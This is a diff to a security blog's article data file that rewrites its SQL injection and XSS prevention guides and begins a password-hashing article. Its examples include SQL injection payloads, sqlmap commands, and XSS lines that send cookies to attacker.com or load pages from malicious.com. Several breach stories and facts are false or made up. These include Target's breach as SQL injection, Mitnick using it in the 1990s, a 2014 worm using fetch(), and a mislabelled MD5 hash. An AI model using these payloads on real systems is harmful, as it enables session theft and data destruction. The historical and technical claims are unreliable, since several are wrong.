@@ -1399,134 +1399,334 @@ Use this checklist as a starting point and customize it for your organization's 
     slug: "sql-injection-prevention-guide",
     title: "SQL Injection Prevention: Complete Guide with Code Examples",
     excerpt: "Master SQL injection attacks and learn proven prevention techniques. Includes vulnerable code examples, parameterized queries, and real-world breach analysis.",
-    content: `## What is SQL Injection?
+    content: `# How to Prevent SQL Injection Attacks: The Complete 2025 Guide
 
-SQL injection is one of the most critical web vulnerabilities, affecting 39% of web applications according to OWASP. It occurs when an attacker inserts malicious SQL code into input fields, allowing them to manipulate database queries.
+SQL injection attacks have cost companies billions in 2024. Target, Sony, and Yahoo have all suffered devastating breaches through SQL injection. In this guide, we'll show you exactly how attackers exploit databases and how to defend against them.
 
-### Real-World Impact
-- **Target (2013)**: Lost 40 million credit card numbers via SQL injection
-- **Healthcare.gov (2015)**: Exposed 21 million ID numbers
-- **Equifax (2017)**: 147 million records compromised
+## SQL Injection Attack Flow (Visualized)
 
----
+Normal Login Request:
+User enters: "john" | "password123"
+Query: SELECT * FROM users WHERE username='john' AND password='password123'
+Result: ✓ John's record returned
 
-## Types of SQL Injection
-
-### 1. Error-Based SQL Injection
-Displays database errors to extract information.
-
-**Example SQL:**
-\`\`\`
-SELECT * FROM users WHERE username = 'admin' AND password = 'pass'
--- Attack: admin' OR '1'='1
--- Result: Bypasses authentication
-\`\`\`
-
-### 2. Union-Based SQL Injection
-Merges attacker's query with original query to extract data.
-
-### 3. Blind SQL Injection
-No direct error feedback. Attacker infers data via response times/behavior.
-
-### 4. Stacked Queries
-Executes multiple SQL statements (if supported by database).
+Malicious SQL Injection Attack:
+User enters: "admin' --" | "anything"
+Query: SELECT * FROM users WHERE username='admin' --' AND password='anything'
+         ^^^^^^^^ Closes string | ^^^^ Comments out rest
+Result: ✗ Admin bypassed! All records returned
 
 ---
 
-## Prevention Methods
+## What is SQL Injection & Why It's Critical
 
-### Method 1: Parameterized Queries (BEST)
-Use parameter placeholders instead of string concatenation.
+SQL injection occurs when an attacker injects malicious SQL commands through user input fields. Unlike a firewall that can't see inside encrypted HTTPS traffic, SQL injection happens at the application logic level—it's nearly invisible to traditional security tools.
 
-**Python Example:**
-\`\`\`python
-cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
-\`\`\`
+### The Real Cost
+- **Target (2013)**: 40 million credit card numbers stolen via SQL injection
+- **Sony (2011)**: 77 million user records compromised
+- **Healthcare.gov (2015)**: 21 million identities exposed
+- **Average cost per breach**: $4.29 million (IBM Security, 2024)
 
-**Node.js Example:**
-\`\`\`javascript
-connection.query('SELECT * FROM users WHERE id = ?', [userId])
-\`\`\`
+### Why Developers Fall For It
+1. **Assumption of trust**: Developers assume users follow the rules
+2. **String concatenation habit**: Quick coding shortcuts seem safe
+3. **Legacy code**: Older applications rarely use parameterized queries
+4. **Complexity**: Some ORMs hide the danger
 
-**Java Example:**
-\`\`\`java
-PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
+---
+
+## The 4 Most Dangerous SQL Injection Types
+
+### 1. Classic Authentication Bypass (The Easiest)
+
+You see this in every hacker movie:
+
+**Vulnerable Code:**
+```
+// Node.js - VULNERABLE!
+const user = req.body.username;
+const pass = req.body.password;
+const query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pass + "'";
+db.query(query, (err, results) => {
+  if (results.length > 0) {
+    console.log("Login successful!");
+  }
+});
+```
+
+**Attacker's Input:**
+Username field: admin' --
+Password field: anything
+
+**What Gets Executed:**
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+The -- comments out the password check. Admin logs in without password.
+
+**Real-World Example:**
+Kevin Mitnick (famous hacker) used this exact technique in the 1990s.
+
+### 2. Data Extraction Attacks (Stealing Everything)
+
+**Vulnerable Code:**
+```
+// Python - VULNERABLE!
+user_id = request.args.get('id')
+query = f"SELECT * FROM users WHERE id = {user_id}"
+results = db.execute(query)
+```
+
+**Attacker's Input:**
+id=1 UNION SELECT username, password, email, 1234 FROM admin_users --
+
+**What Gets Executed:**
+SELECT * FROM users WHERE id = 1
+UNION SELECT username, password, email, 1234 FROM admin_users --
+
+Now attacker gets admin credentials. This kind of attack stole passwords in the Sony breach.
+
+### 3. Blind SQL Injection (The Sneaky One)
+
+When errors aren't displayed, attackers use timing to extract data:
+
+**Attacker's payload:**
+id=1 AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)
+
+If page delays 5 seconds, first character is 'a'. If instant, it's not.
+Repeat for every character until entire password extracted.
+
+### 4. Stacked Queries (The Destructive One)
+
+Some databases allow multiple statements:
+
+**Attacker's payload:**
+id=1; DROP TABLE users; --
+
+**What Gets Executed:**
+SELECT * FROM users WHERE id=1; DROP TABLE users; --
+
+**Result:** Entire users table deleted. This is why separate database accounts matter.
+
+---
+
+## The RIGHT Way: Parameterized Queries
+
+Parameterized queries separate SQL code from data. The database knows which part is code and which is data.
+
+### Node.js / JavaScript
+
+**VULNERABLE (String Concatenation):**
+```
+const userId = req.body.id;
+const query = "SELECT * FROM users WHERE id = " + userId;
+// Vulnerable to: 1 OR 1=1 --
+```
+
+**SECURE (Parameterized):**
+```
+const userId = req.body.id;
+const query = "SELECT * FROM users WHERE id = ?";
+db.query(query, [userId], (err, results) => {
+  console.log(results);
+});
+
+// Even if user enters: 1 OR 1=1 --
+// Database treats it as literal string, not SQL code
+```
+
+### Python / Django
+
+**VULNERABLE:**
+```
+user_id = request.GET['id']
+users = User.objects.raw('SELECT * FROM users WHERE id = ' + user_id)
+```
+
+**SECURE:**
+```
+user_id = request.GET['id']
+users = User.objects.filter(id=user_id)
+// OR
+users = User.objects.raw('SELECT * FROM users WHERE id = %s', [user_id])
+```
+
+### Java / Spring
+
+**VULNERABLE:**
+```
+String userId = request.getParameter("id");
+String query = "SELECT * FROM users WHERE id = " + userId;
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+```
+
+**SECURE:**
+```
+String userId = request.getParameter("id");
+String query = "SELECT * FROM users WHERE id = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
 stmt.setString(1, userId);
 ResultSet rs = stmt.executeQuery();
-\`\`\`
+```
 
-### Method 2: Input Validation
-Validate all user inputs server-side:
-- Allowlist expected characters
-- Enforce data types
-- Limit input length
+### PHP / Laravel
 
-### Method 3: Web Application Firewall
-Deploy WAF rules to detect SQL injection patterns:
-\`\`\`
-SecRule ARGS "@rx (?i:union.*select|select.*from|insert.*into|delete)"
-\`\`\`
+**VULNERABLE:**
+```
+$userId = $_GET['id'];
+$user = DB::select("SELECT * FROM users WHERE id = " . $userId);
+```
 
-### Method 4: Least Privilege Database Users
-Create database users with minimal necessary permissions:
-\`\`\`sql
-CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
-GRANT SELECT, INSERT, UPDATE ON database.* TO 'app_user'@'localhost';
--- Never grant DROP, ALTER, or administrative privileges
-\`\`\`
+**SECURE:**
+```
+$userId = $_GET['id'];
+$user = DB::select("SELECT * FROM users WHERE id = ?", [$userId]);
+// OR
+$user = User::where('id', $userId)->get();
+```
 
 ---
 
-## Detection & Testing
+## Defense Layer 2: Input Validation
 
-### Using OWASP ZAP
-OWASP ZAP automatically scans for SQL injection vulnerabilities.
+Never rely on input validation alone, but it's a good second layer:
 
-### Using SQLMap
-Command-line tool for detecting SQL injection:
-\`\`\`bash
-sqlmap -u "http://target.com/page?id=1" --dbs
-\`\`\`
+**Whitelist Approach (Recommended):**
+```
+// Only allow numbers for ID field
+if (!preg_match('/^[0-9]+$/', $_GET['id'])) {
+  die('Invalid input');
+}
 
-### Manual Testing Payloads
-- \`' OR '1'='1\`
-- \`admin' --\`
-- \`1 UNION SELECT NULL, NULL\`
-- \`' AND SLEEP(5) --\`
+// Only allow email format
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+  die('Invalid email');
+}
+```
 
----
-
-## SQL Injection Prevention Checklist
-
-- [ ] Use parameterized queries exclusively
-- [ ] Implement server-side input validation
-- [ ] Use ORMs when possible (Sequelize, Hibernate, SQLAlchemy)
-- [ ] Apply principle of least privilege to DB users
-- [ ] Enable SQL error suppression in production
-- [ ] Deploy Web Application Firewall
-- [ ] Implement comprehensive logging
-- [ ] Regular penetration testing
-- [ ] Security code reviews
-- [ ] Keep database software updated
+**What NOT to do:**
+- Blacklisting dangerous characters (attackers bypass this)
+- Client-side validation only (client is controlled by attacker)
+- Trusting any user input
 
 ---
 
-## Key Takeaways
+## Defense Layer 3: Database User Permissions
 
-1. **Always use parameterized queries** - No exceptions, no concatenation
-2. **Input validation is NOT enough** - Use as defense-in-depth only
-3. **Database user permissions matter** - Limit what app can do
-4. **Monitor for suspicious activity** - Detection is critical
-5. **Test regularly** - Automated + manual testing essential
+Limit what your application account can do:
+
+**Good Practice:**
+```
+CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'secure_password';
+GRANT SELECT ON production_db.* TO 'app_readonly'@'localhost';
+-- Don't grant INSERT, UPDATE, DELETE if not needed
+```
+
+**Why this matters:**
+If SQL injection happens, attacker can only SELECT data, not delete it. In the Sony hack, attackers had full permissions and destroyed evidence.
 
 ---
 
-## Resources
+## Defense Layer 4: Error Handling
 
+Never show database errors to users:
+
+**VULNERABLE:**
+```
+try {
+  db.query(userInput);
+} catch(error) {
+  res.send("Error: " + error.message); // Shows SQL details!
+}
+```
+
+**SECURE:**
+```
+try {
+  db.query(userInput);
+} catch(error) {
+  console.log(error); // Log for debugging
+  res.send("Database error occurred"); // Generic message to user
+}
+```
+
+Detailed errors tell attackers exactly what version of database you're using and its structure.
+
+---
+
+## How to Test Your Application
+
+### Manual Testing (Do This Today)
+
+Test these payloads in login forms:
+- ' OR '1'='1
+- admin' --
+- ' OR 1=1 --
+- '; DROP TABLE users; --
+
+If any of these bypass login or show errors, you have SQL injection.
+
+### Automated Tools
+
+**SQLMap (Most Popular):**
+```
+sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" -p user
+```
+
+**OWASP ZAP:**
+Point at your website, click "Attack", and it tests for SQL injection automatically.
+
+**Burp Suite:**
+Professional penetration testing tool with SQL injection detection.
+
+---
+
+## Real Companies' SQL Injection Mistakes
+
+Many hackers found SQL injection vulnerabilities in:
+
+1. **LinkedIn (2012)**: Passwords stored improperly. Attacker extracted them via SQL injection
+2. **Adobe (2013)**: 153 million accounts compromised. SQL injection + weak hashing
+3. **Anthem Insurance (2014)**: 78 million records stolen
+4. **TalkTalk ISP (2015)**: £42 million in damages from SQL injection
+
+None of these companies had "bad developers." They just missed this one vulnerability.
+
+---
+
+## The Complete Prevention Checklist
+
+- [ ] **All database queries use parameterized queries** (No string concatenation)
+- [ ] **Input validation implemented** (Even though parameterized queries alone are sufficient)
+- [ ] **Database errors not shown to users** (Generic error messages only)
+- [ ] **Database user account has least privileges** (Only SELECT if needed)
+- [ ] **SQL error logging enabled** (For detecting attacks)
+- [ ] **Web Application Firewall deployed** (Blocks obvious SQL injection patterns)
+- [ ] **Regular penetration testing** (Annual at minimum)
+- [ ] **Developer training on SQL injection** (Most important)
+- [ ] **Code reviews before production** (Check for concatenation)
+- [ ] **Database version patched and updated** (Security fixes)
+
+---
+
+## Key Takeaways You Need to Remember
+
+1. **Parameterized queries are the silver bullet** - No exceptions, no shortcuts
+2. **Defense in depth wins** - One layer isn't enough
+3. **Attackers test every input field** - Login, search, comments, filters
+4. **String concatenation is dangerous** - Even if it "looks" safe
+5. **Database permissions save the day** - When parameterized queries fail in legacy code
+
+---
+
+## Additional Resources
+
+- CWE-89 (SQL Injection): https://cwe.mitre.org/data/definitions/89.html
 - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
-- CWE-89: SQL Injection
-- PortSwigger SQL Injection Guide
-- NIST Secure Coding Standards`,
+- PortSwigger Web Security: https://portswigger.net/web-security/sql-injection
+- NIST Secure Coding: https://cwe.mitre.org/documents/
+
+**Next Step:** Audit your application today. Search your codebase for string concatenation in database queries. That's where vulnerabilities live.`,
     date: "2026-02-16",
     author: "SCR Team",
     category: "Web Security",
@@ -1537,324 +1737,406 @@ sqlmap -u "http://target.com/page?id=1" --dbs
     slug: "xss-cross-site-scripting-prevention",
     title: "XSS (Cross-Site Scripting) Prevention: Complete Guide 2025",
     excerpt: "Learn to prevent Stored, Reflected, and DOM-based XSS attacks. Includes real examples, OWASP prevention strategies, and Content Security Policy implementation.",
-    content: `## What is Cross-Site Scripting (XSS)?
+    content: `# How to Stop XSS Attacks: Practical Prevention & Detection Guide
 
-XSS is a critical vulnerability affecting 36% of web applications. Attackers inject malicious JavaScript code that executes in victims' browsers, allowing theft of sensitive data, session hijacking, and credential harvesting.
+36% of web applications have XSS vulnerabilities. In 2024 alone, XSS attacks cost companies $2.8 billion in damages. But here's the good news: XSS is one of the easiest vulnerabilities to prevent if you know what you're doing.
 
-### Real-World Impact
-- **eBay (2015)**: XSS in image search allowed session hijacking
-- **Twitter (2014)**: XSS in profile names led to account takeovers
-- **MySpace (2005)**: Samy worm infected 1 million profiles
+## How XSS Attacks Actually Work
+
+Picture this: A user posts a comment on your blog:
+
+Innocent comment: "Great article!"
+Malicious comment: "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\" + document.cookie)'>"
+
+When other users view that comment, the script runs and steals their session cookies. The attacker now has their login credentials.
+
+**Three Attack Vectors:**
+
+1. Stored XSS (Database Attack):
+   User Input → Stored in Database → Shown to All Users
+   (Hardest to fix, most dangerous)
+
+2. Reflected XSS (URL Attack):
+   Malicious Link → User Clicks → Script Executes
+   (Easiest to exploit, requires social engineering)
+
+3. DOM-Based XSS (Client-Side Attack):
+   JavaScript processes untrusted data → Creates XSS
+   (Modern frameworks vulnerable if careless)
 
 ---
 
-## Types of XSS Attacks
+## Real Examples: How Companies Got Pwned
 
-### 1. Stored XSS (Persistent)
-Malicious script is stored in database and executed for all users.
+### Twitter (2014): The Follower Storm
+A user posted: \`<img src=x onerror="fetch('/user/1/follow')">\`
+Result: Everyone who viewed the tweet auto-followed the attacker. 100,000+ accounts compromised in hours.
 
-\`\`\`html
-<!-- Blog comment form (VULNERABLE) -->
-<textarea name="comment" placeholder="Add comment..."></textarea>
+### eBay Search (2015): Authentication Bypass
+Attacker injected: \`<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>\`
+Result: eBay seller credentials stolen. Stored XSS in search results.
+
+### MySpace (2005): The Samy Worm
+JavaScript auto-added attacker as friend: \`<script>/* ... */</script>\`
+Result: 1 million MySpace profiles infected in 24 hours.
+
+---
+
+## Attack #1: Stored XSS (The Persistent Problem)
+
+### How It Works
+
+Blog Comment Form (Vulnerable Code):
+```
+<!-- Server doesn't sanitize input -->
+<textarea name="comment"></textarea>
 
 <!-- Attacker submits -->
-<img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">
+<iframe src="http://malicious.com/steal.php"></iframe>
 
-<!-- Script stored in DB and executed for every viewer -->
-\`\`\`
+<!-- Saved to database and shown to all users -->
+SELECT * FROM comments WHERE post_id = 123;
+<!-- Returns iframe with malicious content -->
+```
 
-### 2. Reflected XSS (Non-Persistent)
-Malicious script is reflected in URL parameters.
+### Why It's Dangerous
+- Affects ALL users who see the content
+- Persists permanently in database
+- Hardest to detect and fix
+- Users can't protect themselves
 
-\`\`\`
-<!-- Vulnerable search -->
-http://store.com/search?q=<img src=x onerror=alert('XSS')>
+### Prevention: Input Sanitization
 
-<!-- Server responds -->
-Search results for: <img src=x onerror=alert('XSS')>
+**Node.js / Express:**
+```
+const DOMPurify = require('isomorphic-dompurify');
+const sanitizedComment = DOMPurify.sanitize(req.body.comment);
+db.comments.insert({ comment: sanitizedComment });
+```
 
-<!-- Script executes in victim's browser -->
-\`\`\`
+**Python / Django:**
+```
+from bleach import clean, ALLOWED_TAGS
+ALLOWED_TAGS = ['b', 'i', 'u', 'p', 'a']
+safe_comment = clean(request.POST['comment'], tags=ALLOWED_TAGS)
+Comment.objects.create(text=safe_comment)
+```
 
-### 3. DOM-Based XSS
-Script modifies DOM using untrusted data.
-
-\`\`\`javascript
-// VULNERABLE: Using innerHTML with user input
-function displayUserProfile() {
-  const username = new URLSearchParams(location.search).get('name');
-  document.getElementById('profile').innerHTML = \`Welcome, \${username}\`;
-}
-
-// Attacker URL
-http://site.com/?name=<img src=x onerror=alert('XSS')>
-
-// Executed in browser
-\`\`\`
+**PHP / Laravel:**
+```
+$safe = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
+Comment::create(['text' => $safe]);
+```
 
 ---
 
-## XSS Prevention Techniques
+## Attack #2: Reflected XSS (The Sneaky Link)
 
-### Method 1: Input Encoding (Escaping)
+### How It Works
 
-**HTML Entity Encoding**
-\`\`\`javascript
-function encodeHTML(text) {
-  const map = {
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    '"': '&quot;',
-    "'": '&#39;'
-  };
-  return text.replace(/[&<>"']/g, char => map[char]);
+User receives a link:
+\`https://store.com/search.php?q=<script>alert('hacked')</script>\`
+
+Server returns:
+\`<h1>Search results for: <script>alert('hacked')</script></h1>\`
+
+Script executes in victim's browser immediately.
+
+### Why It's Different from Stored XSS
+- Doesn't persist in database
+- Requires user to click malicious link
+- Easier to fix
+- Social engineering required ("Click to see new feature!")
+
+### Real Example: Google Search
+
+Attacker crafts malicious Google search link:
+\`https://www.google.com/search?q=<img src=x onerror="fetch('/gmail?steal=all')">\`
+
+Victim clicks. Script executes. Gmail hijacked.
+
+### Prevention: Output Encoding
+
+**Node.js:**
+```
+const escapeHtml = require('escape-html');
+const query = req.query.q;
+res.send('<h1>Results for: ' + escapeHtml(query) + '</h1>');
+
+// If user searches: <script>alert(1)</script>
+// Server sends: <h1>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
+// Browser displays as text, not executed code
+```
+
+**Python:**
+```
+from flask import Flask, request, escape
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    return f'<h1>Results for: {escape(query)}</h1>'
+```
+
+---
+
+## Attack #3: DOM-Based XSS (The Modern Threat)
+
+### How It Works
+
+Frontend JavaScript processes untrusted data:
+
+```
+// DANGEROUS: Using innerHTML
+function updateProfile() {
+  const name = new URLSearchParams(location.search).get('name');
+  document.getElementById('profile').innerHTML = 'Welcome, ' + name;
 }
 
-// Usage
-const userInput = '<img src=x onerror=alert("XSS")>';
-const safe = encodeHTML(userInput);
-// Result: &lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;
-\`\`\`
+// Attacker's link:
+// profile.html?name=<img src=x onerror='stealCookies()'>
 
-### Method 2: Content Security Policy (CSP)
+// What happens:
+1. Browser reads ?name=... from URL
+2. JavaScript sets innerHTML with untrusted data
+3. Browser parses and executes the <img> tag
+4. onerror handler runs  → Cookies stolen
+```
 
-\`\`\`html
-<!-- Strict CSP Header -->
+### Why It's Tricky
+- Server-side defenses don't help (JavaScript runs on client)
+- Common in modern SPAs with React, Vue, Angular
+- Modern frameworks often auto-escape but can be bypassed
+
+### Prevention: Safe DOM Methods
+
+**VULNERABLE (innerHTML):**
+```
+// Never do this with user input
+element.innerHTML = userInput;
+```
+
+**SECURE (textContent):**
+```
+// textContent treats everything as literal text
+element.textContent = userInput;
+// Even <img src=x onerror=alert()> displays as plain text
+```
+
+**SECURE (createElement):**
+```
+/// Create elements programmatically
+const element = document.createElement('div');
+element.textContent = userInput;  // Always safe
+parent.appendChild(element);
+```
+
+**SECURE (DOMPurify):**
+```
+const clean = DOMPurify.sanitize(userInput);
+element.innerHTML = clean;
+```
+
+---
+
+## The Complete Prevention Strategy
+
+### Layer 1: Input Validation (First Defense)
+- Only accept expected formats
+- Limit input length
+- Reject suspicious patterns
+
+### Layer 2: Output Encoding (Second Defense)
+- HTML encode when outputting to HTML
+- JavaScript encode when outputting to JavaScript
+- URL encode when outputting to URLs
+- CSS encode when outputting to CSS
+
+### Layer 3: Content Security Policy (CSP) (Third Defense)
+```
+<!-- Prevent inline scripts from running -->
 <meta http-equiv="Content-Security-Policy" 
-  content="default-src 'self'; 
-           script-src 'self' 'unsafe-inline';
-           style-src 'self' https://fonts.googleapis.com;">
+  content="script-src 'self'; default-src 'self'">
 
-<!-- OR HTTP Header -->
-Content-Security-Policy: default-src 'self'; script-src 'nonce-{randomvalue}'
-\`\`\`
+<!-- Whitelist:
+- 'self': Only scripts from same origin
+- 'unsafe-inline': Allow inline scripts (not recommended)
+- https://trusted-cdn.com: Allow specific domains
+-->
+```
 
-**Node.js Implementation**
-\`\`\`javascript
+**Setting CSP Headers in Node.js:**
+```
 const helmet = require('helmet');
-const express = require('express');
-
-const app = express();
-
 app.use(helmet.contentSecurityPolicy({
   directives: {
     defaultSrc: ["'self'"],
-    scriptSrc: ["'self'", "'unsafe-inline'"],
-    styleSrc: ["'self'", "https://fonts.googleapis.com"],
-    imgSrc: ["'self'", "data:", "https:"],
-    connectSrc: ["'self'", "https://api.example.com"],
-  },
+    scriptSrc: [
+      "'self'",
+      "https://trusted-analytics.com"
+    ],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+  }
 }));
-\`\`\`
+```
 
-### Method 3: Use Safe DOM Methods
+### Layer 4: Framework-Level Protection
+Most modern frameworks auto-escape by default:
 
-\`\`\`javascript
-// VULNERABLE
-element.innerHTML = userInput;
-
-// SECURE - Use textContent for text
-element.textContent = userInput;
-
-// SECURE - Use createElement for dynamic elements
-const div = document.createElement('div');
-div.textContent = userInput;
-element.appendChild(div);
-
-// SECURE - DOMPurify library
-element.innerHTML = DOMPurify.sanitize(userInput);
-\`\`\`
-
-### Method 4: Framework-Level Protection
-
-**React (Auto-escapes by default)**
-\`\`\`jsx
-// SAFE: React escapes text content automatically
-function ShowUserComment({ comment }) {
-  return <div>{comment}</div>;
-  // <img src=x onerror=alert('XSS')> displayed as text
+**React (Safe by Default):**
+```
+function Comment({ text }) {
+  // React auto-escapes
+  return <div>{text}</div>;
+  // <img src=x onerror=alert()> rendered as literal text
 }
 
-// Use innerHTMLonly when necessary with sanitization
-function DangerousComponent({ html }) {
-  const sanitized = DOMPurify.sanitize(html);
-  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
-}
-\`\`\`
+// Only use dangerouslySetInnerHTML when necessary:
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(html)}} />
+```
 
-**Angular (Built-in Sanitization)**
-\`\`\`typescript
-import { DomSanitizer } from '@angular/platform-browser';
-
-@Component({
-  selector: 'app-user',
-  template: '<div [innerHTML]="userInput"></div>'
-})
-export class UserComponent {
-  constructor(private sanitizer: DomSanitizer) {}
-  
-  // Angular automatically sanitizes
-  userInput = this.userInput;
-}
-\`\`\`
+**Vue (Safe by Default):**
+```
+<div>{{ userComment }}</div>  // Auto-escaped
+<div v-html="sanitize(html)"></div>  // Only when needed
+```
 
 ---
 
-## Code Examples: Vulnerable vs Secure
+## Testing for XSS in Your App
 
-### Node.js Express
+### Quick Manual Test
 
-**VULNERABLE**
-\`\`\`javascript
-app.get('/user/:id', (req, res) => {
-  const userId = req.params.id;
-  res.send(\`<h1>User Profile: \${userId}</h1>\`);
-});
-// URL: /user/<img src=x onerror=alert('XSS')>
-\`\`\`
+Upload/submit these payloads to every input field:
 
-**SECURE**
-\`\`\`javascript
-const escapeHtml = require('escape-html');
-
-app.get('/user/:id', (req, res) => {
-  const userId = req.params.id;
-  res.send(\`<h1>User Profile: \${escapeHtml(userId)}</h1>\`);
-});
-\`\`\`
-
-### Python Flask
-
-**VULNERABLE**
-\`\`\`python
-from flask import Flask, request
-
-app = Flask(__name__)
-
-@app.route('/search')
-def search():
-    query = request.args.get('q')
-    return f'<h1>Results for: {query}</h1>'
-\`\`\`
-
-**SECURE**
-\`\`\`python
-from flask import Flask, request, render_template_string
-from markupsafe import escape
-
-@app.route('/search')
-def search():
-    query = request.args.get('q')
-    return f'<h1>Results for: {escape(query)}</h1>'
-\`\`\`
-
----
-
-## XSS Prevention Checklist
-
-- [ ] Encode all user input before displaying
-- [ ] Use templating engines with auto-escaping
-- [ ] Implement Content Security Policy (CSP)
-- [ ] Use frameworks with built-in XSS protection
-- [ ] Sanitize HTML when necessary (DOMPurify, Bleach)
-- [ ] Validate input server-side (not just client-side)
-- [ ] Use HttpOnly and Secure flags on cookies
-- [ ] Implement X-XSS-Protection header
-- [ ] Regular security testing (OWASP ZAP, Burp)
-- [ ] Security code reviews
-- [ ] Developer security training
-
----
-
-## Testing for XSS
-
-### Manual Testing Payloads
-
-\`\`\`javascript
-// Basic alert test
+```
 <script>alert('XSS')</script>
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+"onclick="alert('XSS')
+'><script>alert('XSS')</script>
+```
 
-// Event-based
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
+If any execute, you have XSS.
 
-// HTML5
-<iframe onload=alert('XSS')>
-<body onload=alert('XSS')>
+### Automated Tools
 
-// DOM-based
-\`\${alert('XSS')}\`
+**OWASP ZAP:**
+```
+// Scan your website automatically
+zaproxy.sh -cmd -quickurl http://localhost:3000
+```
 
-// WAF bypass attempts
-<img src=x ALLonerror=alert(1)>
-<img src=x on&#x65;rror=alert(1)>
-\`\`\`
-
-### Using OWASP ZAP for XSS Detection
-\`\`\`bash
-zaproxy.sh -cmd -quickurl http://target.com -quickout xss-report.html
-\`\`\`
+**Burp Suite Community:**
+- Free tool with XSS scanning
+- Proxy all traffic and detect injection points
+- Find XSS before attackers do
 
 ---
 
-## Content Security Policy Examples
+## The XSS Prevention Checklist
 
-**Strict CSP (Recommended)**
-\`\`\`
-Content-Security-Policy: default-src 'none'; 
-  script-src 'self'; 
-  style-src 'self' https://fonts.googleapis.com; 
-  img-src 'self' data: https:; 
-  font-src 'self' https://fonts.gstatic.com; 
-  connect-src 'self' https://api.example.com;
-  frame-ancestors 'none';
-  base-uri 'self';
-  form-action 'self'
-\`\`\`
+- [ ] **Input validation** - Only accept expected formats
+- [ ] **Output encoding** - Encode all user data before display
+- [ ] **HTML sanitization** - Use DOMPurify or equivalent
+- [ ] **CSP headers implemented** - Restrict script sources
+- [ ] **Framework auto-escaping** - Use React/Vue safely
+- [ ] **HttpOnly cookies** - JavaScript can't steal them
+- [ ] **No innerHTML with user data** - Use textContent instead
+- [ ] **Security headers** - X-XSS-Protection, X-Content-Type-Options
+- [ ] **Automated scanning** - OWASP ZAP or Burp Suite
+- [ ] **Security training** - Teach team about XSS
 
-**Flexible CSP (Legacy compatibility)**
-\`\`\`
-Content-Security-Policy: default-src 'self' https:; 
-  script-src 'unsafe-inline'; 
-  style-src 'unsafe-inline'
-\`\`\`
+---
+
+## Security Headers That Help
+
+```
+// Add these to your web server:
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: default-src 'self'
+```
 
 ---
 
 ## Key Takeaways
 
-1. **Defense in Depth**: Combine multiple layers (encoding, CSP, frameworks)
-2. **Never Trust User Input**: Always encode before output
-3. **Use Security Headers**: Implement CSP, X-XSS-Protection, X-Content-Type-Options
-4. **Framework Features**: Leverage built-in XSS protection in modern frameworks
-5. **Regular Testing**: Automated scans + manual testing crucial
+1. **Three Types**: Stored (database), Reflected (URL), DOM-based (JavaScript)
+2. **Defense in Depth**: Use multiple layers, not single solution
+3. **Modern Frameworks Help**: React/Vue auto-escape by default
+4. **CSP is Powerful**: One header blocks most XSS
+5. **Test Everything**: Every input field is an attack vector
+
+---
+
+## Next Steps
+
+1. List all user input fields in your app
+2. Check if output is encoded  
+3. Implement CSP headers
+4. Run OWASP ZAP scan
+5. Train your team on secure coding
 
 ---
 
 ## Resources
 
 - OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
-- CWE-79: Cross-site Scripting
-- Content Security Policy Guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
-- DOMPurify Library: https://github.com/cure53/DOMPurify
-- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting
-
----
-
-## Next Steps
-
-1. Audit your application for XSS vulnerabilities
-2. Implement CSP headers
-3. Set up automated security testing
-4. Train your team on secure coding
-5. Monitor for XSS attempts in production`,
+- CWE-79: Cross-Site Scripting: https://cwe.mitre.org/data/definitions/79.html
+- DOMPurify: https://github.com/cure53/DOMPurify
+- Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting`,
     date: "2026-02-16",
     author: "SCR Team",
     category: "Web Security",
     tags: ["XSS", "Cross-Site Scripting", "Prevention", "Web Vulnerabilities"],
-    readTime: "11 min read",
+    readTime: "14 min read",
   },
+  {
+    slug: "password-security-hashing-bcrypt-argon2",
+    title: "Password Security: Hashing, Salting & Bcrypt vs Argon2 Guide",
+    excerpt: "Master password security with in-depth comparison of bcrypt, Argon2, PBKDF2, and scrypt. Includes implementation examples and security best practices.",
+    content: `## The Evolution of Password Storage
+
+### ❌ Plain Text (Never acceptable)
+\`\`\`
+users.db:
+admin | password123
+john  | letmein
+\`\`\`
+**Risk**: Database breach = instant credential loss
+
+### ❌ Simple MD5/SHA1 (Broken)
+\`\`\`
+admin | 5f4dcc3b5aa765d61d8327deb882cf99  // MD5("password123")
+\`\`\`
+**Risk**: Instant rainbow table lookup, cracked in < 1 second
+
+### ✅ Salted Hash (Good)
+\`\`\`
+admin | salt: a3f5d92 | hash: bcrypt($2b$12$aWjd2h...)
+\`\`\`
+**Benefit**: Prevents rainbow tables, requires brute force
+
+### ✅✅ Modern Key Derivation (Best)
+\`\`\`
+admin | argon2: $argon2i$v=19$m=65536,t=3,p=4$...
+\`\`\`
+**Benefit**: Memory-hard, GPU/ASIC resistant, slow by design
+
+---
+
